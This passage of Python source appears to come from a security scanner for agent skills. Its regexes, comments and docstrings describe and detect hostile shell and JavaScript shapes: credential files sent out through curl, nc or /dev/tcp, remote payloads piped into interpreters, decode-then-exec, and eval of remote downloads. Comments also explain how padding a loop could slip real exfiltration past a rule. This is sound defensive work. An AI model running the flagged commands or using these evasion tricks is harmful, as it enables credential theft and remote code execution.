    stack: list = []  # "'", '"', "(" (a `$(` or a `"..."`-nested `$(`), "`"
    i, n = 0, len(text)
    while i < n:
        c = text[i]
        top = stack[-1] if stack else ""
        if c == "\n":
            i += 1
            continue
        if top == "'":
            if c == "'":
                stack.pop()
            else:
                out[i] = " "
            i += 1
            continue
        if c == "\\":
            if top == '"':
                out[i] = " "
                if i + 1 < n and text[i + 1] != "\n":
                    out[i + 1] = " "
            i += 2
            continue
        if top == '"':
            if c == '"':
                stack.pop()
            elif c == "$" and text.startswith("(", i + 1):
                stack.append("(")
                i += 2
                continue
            elif c == "`":
                stack.append("`")
            else:
                out[i] = " "
            i += 1
            continue
        # code context: top-level, or inside "(" / "`"
        if c == "#" and (i == 0 or text[i - 1] in " \t\n;&|("):
            j = text.find("\n", i)
            j = n if j == -1 else j
            for k in range(i, j):
                out[k] = " "
            i = j
            continue
        if c in "'\"":
            stack.append(c)
        elif c == "`":
            if top == "`":
                stack.pop()
            else:
                stack.append("`")
        elif c == "$" and text.startswith("(", i + 1):
            stack.append("(")
            i += 2
            continue
        elif c == "(":
            stack.append("(")
        elif c == ")" and top == "(":
            stack.pop()
        i += 1
    return "".join(out)


_SH_LOOP_CMD_POS = (
    r"(?:(?<=[\n;&|(){])|^)[ \t]*(?:(?:then|do|else|elif|if|while|until|time|!)[ \t]+)*"
)
# No quote/backtick in the lookbehind: `kw` (the code-masked text below) already blanks
# quoted text, so a `for` written inside a string is simply not there to match.
_SH_LOOP_HEAD_RE = re.compile(
    _SH_LOOP_CMD_POS + r"for[ \t]+(?P<var>[A-Za-z_][A-Za-z0-9_]{0,127})[ \t]+in(?=[ \t;\n]|$)"
)
_SH_LOOP_SEG_END_RE = re.compile(r"[;\n]")
_SH_LOOP_DO_RE = re.compile(r"\s*do\b")
_SH_LOOP_DO_DONE_RE = re.compile(r"(?:(?<=[\n;&|(){])|^)[ \t]*(?P<kw>do|done)(?=[\s;&|)]|$)")
# Rebindings that end V's (or X's) prior state: `read`/`unset`/`mapfile`/`readarray`
# (their own argument list is scanned for identifiers), `printf -v NAME`, a nested
# `for NAME in`, a bare `local/declare/typeset NAME` (no `=`), and any ordinary
# `NAME=`/`NAME+=` assignment (optionally `local/export/declare/typeset/readonly`
# prefixed).
_SH_LOOP_BIND_RE = re.compile(
    _SH_LOOP_CMD_POS + r"(?:"
    r"(?:[A-Za-z_][A-Za-z0-9_]{0,127}=\S*[ \t]+)*(?P<cmd>read|unset|mapfile|readarray)\b(?P<args>[^\n;&|]*)"
    r"|printf[ \t]+-v[ \t]+(?P<pv>[A-Za-z_][A-Za-z0-9_]{0,127})"
    r"|for[ \t]+(?P<fv>[A-Za-z_][A-Za-z0-9_]{0,127})[ \t]+in\b"
    r"|(?:local|declare|typeset)(?:[ \t]+-[A-Za-z]+)*[ \t]+(?P<dv>[A-Za-z_][A-Za-z0-9_]{0,127})(?=[ \t]*(?:[;\n&|]|$))"
    r"|(?:(?P<decl>local|export|declare|typeset|readonly)(?:[ \t]+-[A-Za-z]+)*[ \t]+)?"
    r"(?P<var>[A-Za-z_][A-Za-z0-9_]{0,127})(?P<op>\+?=)"
    r")"
)
_SH_LOOP_IDENT_RE = re.compile(r"[A-Za-z_][A-Za-z0-9_]{0,127}")
# A reader substitution inside an assignment's VALUE: `$(cat "$V")`, `` `cat "$V"` ``,
# `$(< "$V")` — command-position `[path/]cat|head|tail|less`, the literal
# `_SH_CRED_ASSIGN_RE`'s own reader vocabulary (cat|less|head|tail|<).
_SH_LOOP_SUBST_READ_RE = re.compile(
    r"(?:\$\(|`)[ \t]*(?:sudo[ \t]+)?(?:(?:[\w./-]*/)?(?:cat|head|tail|less)\b|<)"
    r"(?P<args>[^)`|;\n]{0,2048})"
)
# The PIPE role's own reader: `cat|head|tail "$V"` streamed to STDOUT (no redirect), at
# command position — deliberately narrower than `_SH_LOOP_SUBST_READ_RE` (no `less`, no
# bare `<`, neither of which streams to stdout the same way).
_SH_LOOP_STDOUT_READ_RE = re.compile(
    _SH_LOOP_CMD_POS + r"(?:sudo[ \t]+)?(?:[\w./-]*/)?(?:cat|head|tail)\b(?P<args>[^\n;&|)]{0,2048})"
)
_SH_LOOP_PIPE_AFTER_DONE_RE = re.compile(r"[ \t]*\|(?!\|)(?P<pipe>[^\n;]*)")


def _sh_loop_ref_re(name: str):
    return re.compile(r"\$\{?" + re.escape(name) + r"\b\}?")


def _sh_loop_word_end(text: str, start: int) -> int:
    """End offset of the shell word starting at *start* (an assignment's value):
    quotes, `$(…)`, `${…}` and backticks nest; unquoted whitespace or a separator ends
    it. Never crosses a newline, so a call is always bounded by its own line."""
    stop = text.find("\n", start)
    stop = len(text) if stop == -1 else stop
    stack: list = []
    i = start
    while i < stop:
        c = text[i]
        top = stack[-1] if stack else ""
        if c == "\\" and top != "'":
            i += 2
            continue
        if top in ("'", "`", "{"):
            if c == {"'": "'", "`": "`", "{": "}"}[top]:
                stack.pop()
        elif top == '"':
            if c == '"':
                stack.pop()
            elif c == "`" or (c == "$" and text.startswith("(", i + 1)):
                stack.append(c if c == "`" else "(")
                i += c == "$"
        elif c in "'\"`":
            stack.append(c)
        elif c == "$" and text.startswith(("(", "{"), i + 1):
            stack.append(text[i + 1])
            i += 1
        elif c == "(":
            stack.append("(")
        elif c == ")":
            if not stack:
                return i
            stack.pop()
        elif not stack and c in " \t;&|<>":
            return i
        i += 1
    return min(i, stop)


def _sh_loop_bound_names(m) -> list:
    if m.group("cmd"):
        return [t for t in m.group("args").split() if _SH_LOOP_IDENT_RE.fullmatch(t)]
    for g in ("pv", "fv", "dv", "var"):
        if m.group(g):
            return [m.group(g)]
    return []


def _sh_loop_blank_word_subs(seg: str) -> str:
    """Blank every balanced ``$(...)``/backtick command substitution in a `for`-loop
    word-list segment, same length. A plain whitespace `.split()` cannot tell a
    substitution's own internal whitespace from a real word boundary — `$(ls
    ~/.ssh/id_*)` splits into two tokens, and the second, `~/.ssh/id_*)`, is not itself
    prefixed with `$(` or a backtick, so a per-token "skip if it contains `$(`" check
    (as a naive read of the design's word-skip rule) misses it and leaks a credential-
    shaped fragment into the word list. Blanking the whole substitution here first, so
    it contributes no tokens at all, is what keeps a `$(...)`-built word list at PASS
    (documented FN — the words are unknown until the substitution actually runs)."""
    out = list(seg)
    i, n = 0, len(seg)
    while i < n:
        c = seg[i]
        if c == "$" and seg.startswith("(", i + 1):
            depth = 1
            j = i + 2
            while j < n and depth:
                if seg[j] == "(":
                    depth += 1
                elif seg[j] == ")":
                    depth -= 1
                j += 1
            for k in range(i, j):
                out[k] = " "
            i = j
            continue
        if c == "`":
            j = seg.find("`", i + 1)
            j = n if j == -1 else j + 1
            for k in range(i, j):
                out[k] = " "
            i = j
            continue
        i += 1
    return "".join(out)


def _sh_loop_regions(kw: str, text: str) -> list:
    """Every `for V in <words>; do … done` loop whose word list holds at least one
    credential-shaped word, as `(var, file_words, read_words, body_start, cut_end,
    body_end)`. `file_words`/`read_words` are the loop words matching, respectively,
    `_SH_CRED_FILE_RE` (the DIRECT/PIPE roles' vocabulary) and `_SH_CRED_READ_PATH_RE`
    (the HOP role's vocabulary — the literal `_SH_CRED_ASSIGN_RE` reader vocabulary).
    `cut_end` is `body_end` unless V is rebound inside its own body (`_SH_LOOP_BIND_RE`
    matching V), in which case it is that rebinding's offset: text at/after a rebinding
    is no longer V's loop-seeded value. **Fails closed**: any `do`/`done` imbalance
    anywhere in the file (a stray `done)` case label, an unmatched `do`) returns `[]`
    for the WHOLE file rather than guessing a pairing.

    KNOWN LIMITATION (B-957, filed for 4.3.1, not fixed by B-894): the
    fail-closed blast radius is FILE-WIDE and needs no adversarial intent to trigger —
    an entirely ordinary, unrelated `case "$X" in ...; done) ...;; esac` state block
    ANYWHERE ELSE in the same file (using "done" as an everyday status/state label, a
    common non-adversarial shell idiom) unbalances the same stack and silences every
    loop-based SHELL_CRED_EXFIL finding in the whole file, not just near that block.
    `test_adv_case_label_done_paren_does_not_mispair_fails_closed` in
    `tests/test_b894_shell_loop_cred_taint.py` pins the narrower case (the label sits
    next to the loop under test); `test_adv_unrelated_case_done_label_elsewhere_...`
    pins this broader, unrelated-code-elsewhere shape. There is no small sound fix at
    this lexical-regex layer: a bare `done)` case label is genuinely ambiguous with a
    real subshell wrapping a loop (`(for f in a; do ...; done)`), so telling them apart
    needs case/esac-aware structural do/done tracking, not a regex tweak."""
    pairs: dict = {}
    stack: list = []
    for dm in _SH_LOOP_DO_DONE_RE.finditer(kw):
        if dm.group("kw") == "do":
            stack.append(dm.end("kw"))
        else:
            if not stack:
                return []
            pairs[stack.pop()] = dm.start("kw")
    if stack:
        return []
    seg_ends = [m.start() for m in _SH_LOOP_SEG_END_RE.finditer(kw)]
    out = []
    for m in _SH_LOOP_HEAD_RE.finditer(kw):
        k = bisect.bisect_left(seg_ends, m.end())
        end = seg_ends[k] if k < len(seg_ends) else len(kw)
        do = _SH_LOOP_DO_RE.match(kw, end + 1 if end < len(kw) and kw[end] == ";" else end)
        if do is None:
            continue
        body_start = do.end()
        if body_start not in pairs:
            continue
        body_end = pairs[body_start]
        file_words: set = set()
        read_words: set = set()
        for w in _sh_loop_blank_word_subs(text[m.end() : end]).split():
            w = w.replace('"', "").replace("'", "")
            if _SH_CRED_FILE_RE.search(w):
                file_words.add(w)
            if _SH_CRED_READ_PATH_RE.search(w):
                read_words.add(w)
        if not (file_words or read_words):
            continue
        var = m.group("var")
        cut = body_end
        for b in _SH_LOOP_BIND_RE.finditer(kw, body_start, body_end):
            if var in _sh_loop_bound_names(b):
                cut = b.start()
                break
        out.append((var, frozenset(file_words), frozenset(read_words), body_start, cut, body_end))
    return out


def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
    """B-894: 1-indexed lines where a `for`-loop-bound credential should make
    SHELL_CRED_EXFIL fire, ON TOP OF (never in place of) the existing literal checks in
    `analyze_shell`. Returns `(direct_or_pipe_lines, hop_lines)` — kept separate so the
    caller can report each with the same message its literal twin uses. Three roles,
    each exactly the corresponding literal rule applied to the loop unrolled onto its
    words (see the design note above this section):

      DIRECT — a `file_words` reference inside V's own body, on an outbound line,
        substituted in and re-checked with the UNCHANGED `_SH_CRED_FILE_RE` /
        `_sh_cred_match_is_incluster_auth_only` (so B-415's TLS/in-cluster exemption
        applies identically to the loop form). Reported in `direct_or_pipe_lines`.
      HOP — an in-body assignment `X=`/`X+=` whose value reads a `read_words`-seeded V
        (`$(cat "$V")` etc.); X then carries that taint at every later offset up to its
        next non-accumulating rebinding, checked the same way the literal `cred_vars`
        branch is (no B-415 exemption — the hop vocabulary has no TLS/k8s alternative).
        Reported in `hop_lines`.
      PIPE — the body streams a `read_words`-seeded V to stdout (`cat "$V"`, no `>`),
        and the matching `done` is piped into an outbound command; reported on `done`,
        in `direct_or_pipe_lines`.

    Returns `(set(), set())` (never raises) on any input, including one with no seeded
    loop, an unbalanced `do`/`done`, or a heavily padded/degenerate word list.
    """
    text = _sh_loop_blank_heredocs(_sh_loop_join_continuations(masked))
    kw = _sh_loop_code_mask(text)
    regions = _sh_loop_regions(kw, text)
    if not regions:
        return set(), set()
    direct_hits: set = set()
    hop_hits: set = set()

    def line_of(off: int) -> int:
        return masked.count("\n", 0, off) + 1

    def line_span(off: int):
        a = masked.rfind("\n", 0, off) + 1
        b = masked.find("\n", off)
        return a, (len(masked) if b == -1 else b)

    def outbound(line: str) -> bool:
        return bool(_SH_OUTBOUND_RE.search(line) or _sh_bare_nc_invocation(line))

    # 1. DIRECT: a file_words-seeded V referenced on an outbound line inside its own
    #    body — substitute each candidate word in for every in-region $V on that raw
    #    line, then run the UNCHANGED literal rule on the result.
    #
    # B-894 fix round 1 (review finding 1, BLOCKER): `ref.finditer(text, bs,
    # cut)` yields one match PER REFERENCE to V, and every match on the same physical
    # line needs the identical `line_span`/`outbound`/`spans` work — the substitution
    # result depends only on the line, never on which particular reference started the
    # lookup. The original code redid that whole-line work once per reference instead
    # of once per line, so a line with N references to V cost O(N * line_length): a
    # single bundled shell file with ~6,000+ same-line references to a credential-bound
    # loop variable drove `check_installed_skills`'s 15 s per-check budget
    # (`checks/__init__.py`'s `run_all`) into `ScanBudgetExceeded`, collapsing the
    # WHOLE audit's shell-analysis findings (SHELL_CRED_EXFIL, F-050, F-056, F-064) to
    # UNKNOWN — not just for the offending file. `ref.finditer` yields matches in
    # increasing offset order, so once a line's span `[a, b)` is known via `line_span`,
    # every later match with `start() < b` is on that SAME line and is skipped by a
    # plain integer comparison (`last_b`) — never another `rfind`/`find` scan, and never
    # another `outbound`/`spans` recomputation. That keeps `line_span`, `outbound` and
    # the candidate-word substitution to exactly one run per physical line touched by V,
    # regardless of how many times V is referenced on it — the same one-scan-per-line
    # cost as every other check in `analyze_shell`, including the pre-existing literal
    # SHELL_CRED_EXFIL checks. This changes the DIRECT role's own complexity only: the
    # substituted text and verdict for a given line are unchanged, because the
    # deduped computation is byte-for-byte the same work the per-reference loop used to
    # repeat.
    #
    # B-894 fix round 2 (review finding 1, BLOCKER, introduced by round 1's own
    # dedup): round 1 collapsed the per-REFERENCE cost to per-LINE, but every
    # surviving line still tried EVERY word in `sorted(file_words)` — one
    # `_sh_cred_match_is_incluster_auth_only` call and substitution per word — and
    # only stopped early via `break` once a word both matched `_SH_CRED_FILE_RE`
    # and was NOT exempt. Placing every `file_words` entry right after curl's own
    # --cert/--cacert TLS flag makes the exemption excuse every single
    # substitution, so `break` never fires and the full K-word set is re-walked
    # on every one of L outbound lines: O(K * L). A single bundled shell file with
    # K=1,400 distinct `/.config/appN/x.crt`-shaped words and L=1,400 such lines
    # (96 KB) already exceeded the 15 s per-check scan budget. The fix: the
    # TLS/in-cluster exemption verdict for a given (line, reference-span) depends
    # only on the raw line's own flag/prefix structure around the substituted
    # span — never on WHICH word fills it, since every `file_words` entry already
    # matches `_SH_CRED_FILE_RE` on its own and is inserted intact. So the
    # substitution and its exemption check are computed ONCE per line using a
    # single representative word, not once per word — restoring O(1)
    # exemption-checks per line regardless of how large `file_words` is, the same
    # amortization round 1 already applied to same-line reference count, just
    # applied to the other multiplication axis (distinct file_words × distinct
    # outbound lines) that round 1 did not touch. CORRECTION (round 3 review):
    # round 2's claim that "the representative word's exemption outcome is the
    # same as every other file_word's would be" is only true of the position-only
    # TLS-material-flag arm, never of the in-cluster-token arm, which reads the
    # substituted word's own text -- see round 4 below.
    #
    # B-894 fix round 3 [sic; the fourth round of this specific mechanism, see the
    # task history] (review finding, BLOCKER, introduced by round 2's own fix):
    # `_sh_cred_match_is_incluster_auth_only`'s in-cluster-token arm decides
    # `is_incluster_token` from the SUBSTITUTED word's own text
    # (`_INCLUSTER_TOKEN_PATH_RE.search(m.group(0))`), which is content, not
    # position -- unlike the TLS-flag arm. Round 2's single `rep_word` therefore
    # decided that arm for the WHOLE word list: padding a real credential path's
    # loop word list with the harmless in-cluster service-account token path
    # (which sorts first lexicographically, `/var/... < ~/...`) made `min()` pick
    # the token, so the line was excused even though the loop also binds the same
    # variable to the real credential on another iteration -- laundering a real
    # exfil past this crit rule. Fix: precompute, once per REGION (not per line,
    # so no return to O(K) per line), whether EVERY word in `file_words` is
    # itself the in-cluster token path; only that all-or-nothing verdict may
    # stand in for "this word is the token" in the exemption check, matching the
    # design's own "loop is sugar for BODY repeated per word" invariant -- a line
    # is exempt for the loop as a whole only when it would be exempt for every
    # word the loop could substitute there. The position-only TLS-flag arm is
    # untouched and still uses the single representative word, since that arm's
    # verdict genuinely does not depend on which word fills the slot.
    for var, file_words, _read_words, bs, cut, _be in regions:
        if not file_words:
            continue
        rep_word = min(file_words)
        region_all_incluster_token = all(_sh_word_is_incluster_token(w) for w in file_words)
        ref = _sh_loop_ref_re(var)
        last_b = None
        for rm in ref.finditer(text, bs, cut):
            if last_b is not None and rm.start() < last_b:
                continue
            a, b = line_span(rm.start())
            last_b = b
            raw = masked[a:b]
            if not outbound(raw):
                continue
            spans = [
                (x.start() - a, x.end() - a) for x in ref.finditer(text, max(a, bs), min(b, cut))
            ]
            pieces, last = [], 0
            for s0, e0 in spans:
                pieces.append(raw[last:s0])
                pieces.append(rep_word)
                last = e0
            pieces.append(raw[last:])
            sub = "".join(pieces)
            if _SH_CRED_FILE_RE.search(sub) and not _sh_cred_match_is_incluster_auth_only(
                sub, masked, all_incluster_token=region_all_incluster_token
            ):
                direct_hits.add(line_of(rm.start()))

    # 2. HOP: X=... $(cat "$V") ... inside V's body, V read_words-seeded -> X carries
    #    that taint positionally (one hop; nothing hops a second time from X).
    events: dict = {}
    hop_names: set = set()
    binds = []
    for b in _SH_LOOP_BIND_RE.finditer(kw):
        names = _sh_loop_bound_names(b)
        if not names:
            continue
        if b.group("var") and b.group("op"):
            vend = _sh_loop_word_end(text, b.end())
            binds.append((vend, b.group("var"), b.group("op"), text[b.end() : vend], b.start()))
        else:
            for nm in names:
                binds.append((b.end(), nm, "clear", "", b.start()))
    for vend, name, op, val, bstart in binds:
        hop: set = set()
        if op != "clear":
            for var, _fw, read_words, bs, cut, _be in regions:
                if not read_words or not (bs <= bstart < cut):
                    continue
                for sm in _SH_LOOP_SUBST_READ_RE.finditer(val):
                    if _sh_loop_ref_re(var).search(sm.group("args")):
                        hop |= read_words
        if hop:
            hop_names.add(name)
        events.setdefault(name, []).append((vend, op, frozenset(hop), val))
    state_hist: dict = {}
    for name in hop_names:
        evs = sorted(events[name], key=lambda e: e[0])
        offs, taints = [], []
        cur: frozenset = frozenset()
        for off, op, hop, val in evs:
            if op == "clear":
                cur = frozenset()
            else:
                keep = op == "+=" or bool(_sh_loop_ref_re(name).search(val))
                cur = frozenset(hop | (cur if keep else frozenset()))
            offs.append(off)
            taints.append(cur)
        state_hist[name] = (offs, taints)
    if state_hist:
        pos = 0
        for raw in masked.split("\n"):
            i = masked.count("\n", 0, pos) + 1
            if outbound(raw):
                for name, (offs, taints) in state_hist.items():
                    for rm in _sh_loop_ref_re(name).finditer(text, pos, pos + len(raw)):
                        k = bisect.bisect_right(offs, rm.start())
                        if k and taints[k - 1]:
                            hop_hits.add(i)
            pos += len(raw) + 1

    # 3. PIPE: `done | <outbound>`, body streams a read_words-seeded V to stdout.
    for var, _fw, read_words, bs, cut, be in regions:
        if not read_words:
            continue
        ref = _sh_loop_ref_re(var)
        streams = False
        for sm in _SH_LOOP_STDOUT_READ_RE.finditer(kw, bs, cut):
            a0, a1 = sm.start("args"), sm.end("args")
            if ref.search(text[a0:a1]) and ">" not in kw[a0:a1]:
                streams = True
                break
        if not streams:
            continue
        done_end = be + 4  # len("done")
        pm = _SH_LOOP_PIPE_AFTER_DONE_RE.match(text, done_end)
        if not pm:
            continue
        pipe = re.split(r"&&|\|\|", pm.group("pipe"))[0]
        if _SH_OUTBOUND_RE.search(pipe) or _sh_bare_nc_invocation(pipe):
            direct_hits.add(line_of(be))
    return direct_hits, hop_hits


def _sh_mask_comments(source: str) -> str:
    """Blank whole-line shell comments while preserving line numbers, so a documented
    'curl ... | sh' example in a comment can't fire."""
    return "\n".join("" if ln.lstrip().startswith("#") else ln for ln in source.splitlines())


def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
    """Conservative regex pass over a bundled .sh/.bash/.zsh file (F-050). No shell AST;
    stdlib regex only; never raises, never executes. Flags high-confidence shapes:

      SHELL_CRED_EXFIL (crit) — a credential file is read and its contents reach an
        outbound command (curl/wget/nc//dev/tcp): read a secret -> send it out.
      SHELL_PIPE_INTERP (crit) — a remote payload is downloaded and piped straight into a
        non-shell interpreter (curl URL | python/node/perl/...): remote code execution.
      SHELL_DECODE_EXEC (crit) — an encoded blob is decoded (base64/xxd/openssl -d) and
        piped straight into a shell/interpreter: obfuscated remote code execution.
      SHELL_EVAL_REMOTE (crit) — eval/source of a remote download
        (eval "$(curl … http…)" / source <(wget … http…)): remote code execution.
      SHELL_ENV_EXFIL (crit) — a credential-shaped env var ($…TOKEN/$…SECRET/…) is sent
        over a RAW socket (nc//dev/tcp): credential exfiltration.

    Whole-line comments are ignored so documentation examples stay clean. The naive
    forms — any $VAR piped to curl (authed-API scripts), or any bare $() command
    substitution — stay deliberately out of scope: SHELL_EVAL_REMOTE and SHELL_ENV_EXFIL
    are the tight, zero-FP slices of those (remote-fed eval; raw-socket-only, cred-named)."""
    out: list[ASTFinding] = []
    seen: set = set()

    def add(rule: str, sev: str, ln: int, reason: str) -> None:
        if (rule, ln) not in seen:
            seen.add((rule, ln))
            out.append(ASTFinding(rule, sev, ln, reason))

    masked = _sh_mask_comments(source)

    for m in _SH_PIPE_INTERP_RE.finditer(masked):
        ln = masked.count("\n", 0, m.start()) + 1
        add(
            "SHELL_PIPE_INTERP",
            "crit",
            ln,
            "downloads a remote payload and pipes it into an interpreter "
            "(curl/wget ... | python/node/perl/...) — remote code execution",
        )

    for m in _SH_DECODE_EXEC_RE.finditer(masked):
        ln = masked.count("\n", 0, m.start()) + 1
        add(
            "SHELL_DECODE_EXEC",
            "crit",
            ln,
            "decodes an encoded blob and pipes it into a shell/interpreter "
            "(base64/xxd/openssl -d | sh) — obfuscated remote code execution",
        )

    for ln, path in _sh_staged_exec(masked):
        add(
            "SHELL_STAGED_EXEC",
            "crit",
            ln,
            f"downloads a remote payload to {path} and then executes that same path — "
            "staged remote code execution (the payload never appears in this file)",
        )

    for m in _SH_EVAL_REMOTE_RE.finditer(masked):
        ln = masked.count("\n", 0, m.start()) + 1
        add(
            "SHELL_EVAL_REMOTE",
            "crit",
            ln,
            "eval/source of a remote download (eval \"$(curl ... http...)\") — "
            "remote code execution",
        )

    for i, raw in enumerate(masked.splitlines(), 1):
        # B-430: the raw-socket check is `_SH_RAW_SOCKET_RE` (ncat/netcat/`/dev/tcp/`,
        # unambiguous) OR'd with `_sh_bare_nc_invocation` (the token classifier for the
        # ambiguous bare `nc` — see its docstring above).
        if (
            _SH_RAW_SOCKET_RE.search(raw) or _sh_bare_nc_invocation(raw)
        ) and _SH_CRED_ENV_RE.search(raw):
            add(
                "SHELL_ENV_EXFIL",
                "crit",
                i,
                "a credential-shaped environment variable is sent over a raw socket "
                "(nc//dev/tcp) — credential exfiltration",
            )

    cred_vars = {m.group("var") for m in _SH_CRED_ASSIGN_RE.finditer(masked)}
    # B-894: loop-unrolled counterparts of the two checks below — see the design note
    # above `_sh_mask_comments`. `loop_direct_lines` is the DIRECT/PIPE roles (the
    # `_SH_CRED_FILE_RE` sink-line vocabulary, same message/exemption as the block right
    # below); `loop_hop_lines` is the HOP role (joins `cred_vars`, same message, no
    # exemption — matches how `cred_vars` itself gets none).
    loop_direct_lines, loop_hop_lines = _sh_loop_cred_exfil_lines(source, masked)
    for i, raw in enumerate(masked.splitlines(), 1):
        # B-430: same OR pattern as above — see _sh_bare_nc_invocation's docstring.
        if not (_SH_OUTBOUND_RE.search(raw) or _sh_bare_nc_invocation(raw)):
            continue
        if _SH_CRED_FILE_RE.search(raw):
            # B-415: curl's own TLS-material flags, and the narrow in-cluster
            # token in an Authorization header aimed at the cluster's own API
            # server, are legitimate in-cluster auth -- not exfiltration.
            if not _sh_cred_match_is_incluster_auth_only(raw, masked):
                add(
                    "SHELL_CRED_EXFIL",
                    "crit",
                    i,
                    "reads a credential file and sends it to an outbound command "
                    "(curl/wget/nc) — credential exfiltration",
                )
                continue
            # B-911: the B-415 exemption above is judged ONLY against the literal
            # `_SH_CRED_FILE_RE` match itself (the TLS-flag path / the narrow
            # in-cluster Authorization token) -- it says nothing about a
            # DIFFERENT credential variable also sent on the same line. Fall
            # through to the variable check below instead of `continue`-ing
            # past it, so an exempt TLS path can never launder an unrelated
            # `cred_vars` hit in the same command.
        if i in loop_direct_lines:
            add(
                "SHELL_CRED_EXFIL",
                "crit",
                i,
                "reads a credential file and sends it to an outbound command "
                "(curl/wget/nc) — credential exfiltration",
            )
        if any(re.search(r"\$\{?" + re.escape(v) + r"\b", raw) for v in cred_vars) or (
            i in loop_hop_lines
        ):
            add(
                "SHELL_CRED_EXFIL",
                "crit",
                i,
                "a credential-file value flows into an outbound command "
                "(curl/wget/nc) — credential exfiltration",
            )
    return out


# --------------------------------------------------------------------------- #
# analyze_javascript (F-064): lexical JS/TS pass — the JS blind spot.          #
# Hybrid severity: eval/Function of a decoded blob and remote fetch-then-exec  #
# are crit (obfuscated RCE, zero-FP); every other rule is warn (often legit).  #
# B-743: the warn set is NOT enumerated here — it was, as two, and went stale   #
# when a third arrived, which is how the consuming bucket's advice went false.  #
# The list lives in the function docstring below and in checks/_vet.py's        #
# _JS_WARN_REMEDIATION, which a test keeps complete. No JS parser; stdlib re.   #
# --------------------------------------------------------------------------- #
# eval / new Function of a base64-decoded blob — obfuscated code execution.
_JS_EVAL_DECODED_RE = re.compile(
    r"\b(?:eval|(?:new\s+)?Function)\s*\(\s*"
    r"(?:atob\s*\(|Buffer\.from\s*\([^)\n]*['\"]base64['\"])",
    re.I,
)
# remote code fetched then executed: a dynamic import of a URL, a then-eval chained on a
# fetch, or an eval over an awaited fetch.
_JS_EVAL_REMOTE_RE = re.compile(
    r"\bimport\s*\(\s*['\"]https?://"
    r"|\.then\s*\(\s*eval\b"
    r"|\beval\s*\(\s*await\b[^;\n]*\bfetch\s*\(",
    re.I,
)
# child_process exec-family with an interpolated command — command-injection surface.
# Three receiver shapes, captured so the caller can tell `child_process.exec(` apart
# from an unrelated method of the same name on some other object (a DB client's own
# `.exec()`, a compiled RegExp's `.exec()`, ...) — see _js_child_process_bindings:
#   group 1 — a simple identifier receiver, e.g. `cp.exec(` (needs a resolved binding)
#   group 2 — an inline `require('child_process').exec(` chain (unambiguous, no
#             binding needed: the module name is right there in the same expression)
#   group 3 — the exec-family function name actually called
_JS_CP_TEMPLATE_RE = re.compile(
    r"\b(?:([A-Za-z_$][\w$]*)\."
    r"|(require\(\s*['\"](?:node:)?child_process['\"]\s*\)\s*\.))?"
    r"(exec|execSync|execFile|spawn|spawnSync)\s*\(\s*`[^`]*\$\{",
)
# Binds a name to the child_process module: `const cp = require('child_process')`,
# `import cp from 'node:child_process'`, `import * as cp from 'child_process'`.
_JS_CP_NAMESPACE_BIND_RE = re.compile(
    r"\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*require\(\s*['\"](?:node:)?child_process['\"]\s*\)"
    r"|\bimport\s+(?:\*\s+as\s+)?([A-Za-z_$][\w$]*)\s+from\s+['\"](?:node:)?child_process['\"]",
)
# Destructures exec-family names directly out of child_process: `const { exec, spawn } =
# require('child_process')`, `import { exec, spawn as sp } from 'node:child_process'`.
_JS_CP_DESTRUCTURE_BIND_RE = re.compile(
    r"\{\s*([^}]+?)\s*\}\s*=\s*require\(\s*['\"](?:node:)?child_process['\"]\s*\)"
    r"|\bimport\s*\{\s*([^}]+?)\s*\}\s*from\s+['\"](?:node:)?child_process['\"]",
)


def _js_child_process_bindings(masked: str) -> "tuple[set, set]":
    """Which local names actually resolve to the child_process module (`receivers`,
    e.g. `cp` in `cp.exec(...)`) or to one of its exec-family functions destructured
    directly (`names`, e.g. `exec` in `const {exec} = require('child_process')`).

    `child_process` itself is always a valid receiver — it is the module's own,
    unambiguous canonical name, usable inline (`require('child_process').exec(...)`)
    with no assignment for this lexical pass to see. Every other receiver or bare name
    must be traced to an actual binding: this is what stops `this.db.exec(...)` (a
    SQLite client's own `.exec()`) or a compiled RegExp's `.exec()` from reading as
    child_process merely because the file also imports it for something else,
    somewhere else, under a different name.
    """
    receivers = {"child_process"}
    names: set = set()
    for m in _JS_CP_NAMESPACE_BIND_RE.finditer(masked):
        bound = m.group(1) or m.group(2)
        if bound:
            receivers.add(bound)
    for m in _JS_CP_DESTRUCTURE_BIND_RE.finditer(masked):
        group = m.group(1) or m.group(2)
        if not group:
            continue
        for entry in group.split(","):
            # `exec` or `exec: myExec` (rename) or `exec as myExec` (ESM rename) —
            # the LOCAL bound name is what a call site actually uses, so take the
            # part after the alias operator when one is present, else the whole entry.
            entry = entry.strip()
            if not entry:
                continue
            local = re.split(r":\s*|\s+as\s+", entry)[-1].strip()
            if local:
                names.add(local)
    return receivers, names
# require() of a non-literal (bareword identifier or template) — dynamic module load.
_JS_DYN_REQUIRE_RE = re.compile(
    r"\brequire\s*\(\s*(?:`[^`]*\$\{|[A-Za-z_$][\w$.]*\s*[)+])",
)
# process.dlopen() — a direct native-addon (.node) load: the native-boundary escape.
# Node's own docs (process.dlopen) say require() should be preferred and it "should not
# be used directly"; direct use in plugin runtime JS is a red flag. warn-only.
_JS_NATIVE_DLOPEN_RE = re.compile(
    r"\bprocess\.dlopen\s*\(",
)


def _js_block_comment_spans(source: str) -> list[tuple[int, int]]:
    """Every `/* ... */` block-comment span in `source`, as `(start, end)` character
    offsets (`end` is exclusive, just past the closing `*/`) -- found with a LINEAR
    `str.find()` scan, never a backtracking lazy-DOTALL regex (B-377).

    The regex this replaced -- `re.findall(r"/\\*(.*?)\\*/", source, flags=re.S)` --
    degrades to O(openers x filesize): every `/*` that is never closed by a `*/` makes
    the lazy `.*?` re-scan from that opener all the way to EOF before giving up.
    ORDINARY JavaScript/TS is full of such openers -- e.g. a tsconfig-style path-mapping
    block (`"src/*": ["./src/*"]`) has a literal `/*` substring per glob entry with no
    closing `*/` anywhere -- so a large, completely benign file blew the 15s per-check
    scan budget (both `check_persona_jailbreak`/B66 and `check_overt_secret_exfil`/B156
    hit `ScanBudgetExceeded` and degraded to UNKNOWN, pinning a clean config at grade F).

    The moment one `/*` has no closing `*/` anywhere in the remainder of `source`, NO
    later `/*` can find one either -- its search space is a SUFFIX of that same
    remainder. So this scan can safely STOP at the first unclosed opener, which exactly
    matches the old regex's own behavior (an unclosed `/*` was never part of a match
    there either, and nothing after it could match once the last real `*/` in the file
    is behind the scan position) -- while doing at most one forward `str.find()` per
